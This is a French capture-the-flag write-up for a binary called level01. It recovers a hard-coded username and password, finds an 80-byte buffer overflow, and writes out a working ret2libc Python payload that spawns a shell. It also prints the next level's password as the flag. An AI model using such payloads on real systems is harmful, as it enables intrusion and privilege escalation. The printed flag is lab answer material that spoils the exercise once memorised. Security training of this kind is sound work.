# Exploitation du binaire `level01`

Une fois que l'on a récupéré l'exécutable avec `scp`, on le lance dans le décompilateur, et il nous montre que le **username** recherché est `dat_wil`.

Donc on le tente, et effectivement c’est le bon username, car on passe à l'étape suivante, qui est le **mot de passe**.

En cherchant dans le code décompilé, on trouve une fonction similaire à `verify_user_name`, appelée `verify_user_pass`, où l'on repère la chaîne `"admin"`. On entre `admin`, et ça marche.

J'observe ensuite l’allocation mémoire sur les deux décompilateurs : on a **64 octets** alloués, donc on essaie de remplir `59 + "admin"` (ce qui fait 64) mais toujours rien.
Puis, en épluchant un peu le `main`, j’observe un appel à `fgets` qui prend **100 octets** d’allocation.

Donc je remplis à 100 → **segfault**, très bien.
Je remplis à 90 → **segfault** aussi.
80 → encore segfault.
70 → **plus de segfault**.
75 → segfault.
On trouve donc que **80 octets** est le nombre exact pour provoquer un dépassement de mémoire.

---

C’est un programme en **C** qui utilise la **libc**. On le confirme en exécutant :

```gdb
(gdb) info function
All defined functions:

Non-debugging symbols:
0x08048318  _init  
0x08048360  printf  
0x08048360  printf@plt  
0x08048370  fgets  
0x08048370  fgets@plt  
0x08048380  puts  
0x08048380  puts@plt  
**0x08048390  __gmon_start__**  
**0x08048390  __gmon_start__@plt**  
0x080483a0  __libc_start_main  
```

On a donc tout ce qu’il faut à disposition pour **exécuter un shell sans shellcode**, en exploitant uniquement ce qu’on a dans la **libc**.


Pour trouver l'adresse de la string /bin/sh on effectue cette commande sur gdb :

```gdb
find &system,+9999999,"/bin/sh"
```

---

## Plan d’exploitation

* \[On remplit le tampon de 80 octets → `A*80`]
* \[On fait appel à `system()` pour exécuter notre commande]
* \[On donne à `system()` une adresse de retour propre = `exit()`]
* \[Enfin, la commande à exécuter → `"/bin/sh"`]

Ce qui nous fait :

```plaintext
[A*80] + [system] + [ret = exit] + ["/bin/sh"]
```

---

## Exploit (little-endian)

```bash
(python -c 'print("dat_wil\n"  # username
    + "B"*80                   # remplissage du tampon
    + "\xd0\xae\xe6\xf7"       # adresse de system
    + "\x70\xeb\xe5\xf7"       # adresse de exit
    + "\xec\x97\xf8\xf7"       # adresse de "/bin/sh"
    )'; cat) | ./level01
```


```bash
(python -c 'print("dat_wil\n"+ "B"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level01
---

## Vérification

Une fois dans notre shell, on vérifie bien le tout :

```bash
$ whoami
level02
$ cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

---

## 🏁 Flag

**PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv**

---
